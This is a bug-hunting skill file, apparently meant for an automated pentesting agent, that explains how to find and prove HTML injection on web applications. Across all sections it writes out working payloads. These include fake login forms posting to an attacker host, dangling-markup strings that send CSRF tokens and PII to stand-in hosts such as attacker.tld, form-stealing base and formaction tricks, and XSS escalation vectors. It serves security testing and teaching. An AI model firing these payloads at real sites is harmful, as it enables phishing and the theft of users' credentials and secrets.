---
name: html-injection
description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to xss."
---

## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.

## Web-Research Methodology Additions (2026)

Research basis: PortSwigger Web Security Academy "Dangling markup injection," HackTricks "Content Spoofing (Text and HTML Injection)," and HackTricks "Dangling Markup — HTML scriptless injection." Together they cover the two directions HTML injection can go: **fake content on a trusted surface**, and **scriptless exfiltration of real content that follows your injection point**.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Content-spoofing surfaces:** error pages, `?error=` / `?msg=` / `?message=`, "not found" pages that echo the path, status texts, search pages that print the query inside a sentence, and stock/recommendation-style messages. Replace with a long, realistic message (phone number, urgent instruction, fake domain) and check it renders completely.
- **HTML-injection escalation test:** if `<` and `>` return unencoded, switch from text injection to markup — `<h3>...`, `<form>`, `<a href>`, `<img>`, `<base>`, `<meta http-equiv>`.
- **Sensitive pages matter:** login, payment, account settings, and admin-visible fields raise impact; a clearly-labelled echoed error string on a marketing page may be harmless.
- **Service-sent emails:** any field copied into an email to *other* users (display name, first/last name, org/team/workspace/project name, invite message, comment body, ticket title, file name). Trigger invites/shares/mentions and read the raw message in a real client.
- **Dangling-markup prerequisites:** a secret (CSRF token, email, PII) rendered in clear text *after* your injection point, and a reflection that leaves `>`/`"` unescaped so you can break out of an attribute.
- **CSP check first:** read `Content-Security-Policy` before choosing a vector. Chrome now blocks HTTP URLs containing raw `<` or newline, so dangling markup may need `ftp:` or a user-interaction variant.
- **JSONP endpoints** (`?callback=`, `?call=`) as a way to call arbitrary functions or execute JS from an injected `<script src>`.

- **Context map:** for each reflection point record the HTML context (between tags, inside an attribute, inside `<script>`, in a comment) — the break-out string differs (`">`, `'>` , `*/`).
- **Encoding oracle:** compare how the app treats `<`, `>`, `"`, `'`, `/`, and `&` — a WAF that blocks `<script>` often still passes `<b>` or `<img>`.
- **Stored vs reflected:** inject once, then re-fetch the display page in a fresh session to confirm persistence and who else sees it.
- **Email raw source:** always download the .eml/raw view, not just the rendered preview — clients sanitize differently and the raw source is the evidence.
- **Post-injection content:** identify what sensitive value (CSRF token, email, PII) appears *after* your injection point — without it, dangling markup captures nothing.
- **CSP parse:** note `img-src`, `style-src`, `connect-src`, `form-action`, and `default-src` — these determine which dangling vector is viable.
- **Path parameter echoes:** test URL path segments too, not just query params — "not found" pages often echo the path unescaped.
- **Admin-visible fields:** ticket titles, usernames in logs, file names — stored markup here reaches staff sessions and raises impact.
- **Autofill surface:** an injected form can still harvest credentials via browser autofill even under strict CSP — test `form-action` and password managers.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Fake login form (OWASP canonical):** inject `<h3>Please Enter Your Username and Password…</h3><form method="POST" action="http://attacker/login.php">…</form>`. Even under strict CSP a form can abuse browser password autofill — check `form-action`.
- **Email-context injection:** `<a href="https://OAST.example/x">Click here to accept</a>`, `<u>evil.com</u>`, `<img src="https://OAST.example/pixel.png">` — proof is rendered markup or an OAST hit inside a genuine service email. (SMTP header/second-body injection via CRLF is a separate Email Injection class.)
- **Classic dangling capture:** break out with `">` then `<img src='//attacker.tld/log?` — the browser consumes everything up to the next `'` as the URL, sending the following HTML (and any secret) to you. Test both single- and double-quoted variants.
- **Alternatives when `<img>` is blocked:** `<meta http-equiv="refresh" content="4; URL='http://attacker/log?` (or `ftp:`), `<style>@import//attacker.tld?` (captures until `;`), `<table background='//collaborator-id?…'`, `<video poster="//…`, `<link rel=stylesheet href="//evil?`.
- **Form-stealing variants:** `<base href="http://attacker/">` redirects all relative form actions; injecting a new `<form action='http://attacker/log'>` overwrites the next form header so its data is exfiltrated; `<button formaction="https://attacker">` redirects a submit; injecting `<input type='hidden' name='x' value="` captures to the next quote and can be combined with a new form.
- **No-JS exfil via `<noscript>`:** `<noscript><form action=http://attacker><textarea name=contents></noscript>` captures page content to the bottom of the document.
- **User-interaction CSP bypass (PortSwigger research):** inject a visible `<a href=...>` plus `<base target='` so the captured markup lands in `window.name`; the attacker-controlled destination page then reads `window.name` and beacons it out. Related: dangling-iframe `name` attribute leakage and stealthy password capture via injected submit buttons.
- **Script/HTML namespace gadgets:** inject `<input type=hidden id=share_with value=attacker>` to win a `getElementById` race, or `<img id=is_public>` to create a JS global that alters a later authorization branch. JSONP injection can invoke `set_sharing({...})` or `alert(1)`.
- **Same-site leaks (SS-Leaks):** with markup injection on a same-origin page, nested `<object>` fallbacks and lazy-loading/responsive images can turn a 200-vs-404 difference into a request to your endpoint even against `SameSite=Lax` and a restrictive CSP.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Plain HTML injection proof:** your vector appears with literal `<` angle brackets in the response (not `&lt;`). Use a unique numeric canary (e.g. `alert(91234)`) to distinguish your reflection from practice-page hint text.
- **Dangling markup proof = OOB data, not a rendered color.** Stand up a Collaborator/OAST listener and show the captured chunk (ideally the actual token/PII) arriving. A 0-byte image or a CSP-blocked request looks identical in DevTools — confirm on the listener side.
- **Email injection proof:** show the markup rendered in a real email client *and* in the raw source, plus any OAST pixel hit; note that a link alone may be judged lower severity than a captured secret.
- **Fake-form proof:** demonstrate a real form on the trusted domain pointing at your endpoint (and, where possible, that autofill/targeting works) — not merely that a tag rendered.
- **Avoid false positives:** (1) escaped `&lt;b&gt;` means no injection; (2) text that is clearly labelled as user input may be harmless content spoofing; (3) no OOB callback = no dangling exfil; (4) if the secret never appears after the injection point, the capture is empty — re-target the injection point.
- **Escalate when possible:** if `<img onerror>`/`<svg onload>` executes, this is XSS, not HTML injection — reclassify and follow the xss skill.

- **Three-way diff:** compare (a) benign text, (b) `<b>CANARY</b>`, (c) encoded `&lt;b&gt;CANARY&lt;/b&gt;` — only (b) with literal `<` proves injection.
- **OOB verification:** check the Collaborator/OAST listener for the captured chunk; DevTools showing a failed image is not proof.
- **Quote-variant check:** if single-quote dangling fails, try double-quote and no-quote forms; the surrounding markup determines where capture ends.
- **CSP-blocked case:** if `img-src`/`default-src` blocks your URL, say the vector is dead rather than reporting a non-working PoC.
- **Secret actually captured:** confirm the OOB request contains the expected token/PII substring, not just an empty hit.
- **Email proof:** show rendered markup in a real client plus the raw source, and any OAST pixel hit.
- **Reclassify to XSS:** if `onerror`/`onload` executes, switch to the `xss` skill — don't under-report as HTML injection.
- **Autofill proof:** show a form on the trusted domain whose `action` is your endpoint; that is the phishing primitive.
- **Namespace-gadget proof:** for `id`-based gadgets, show the later script reading your injected element and the resulting state change.
- **Content-spoofing-only downgrade:** if everything is escaped but the text renders, report as content spoofing (Low/Informational), not HTML injection.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/cross-site-scripting/dangling-markup
2. https://hacktricks.wiki/en/pentesting-web/content-spoofing-text-injection.html
3. https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html
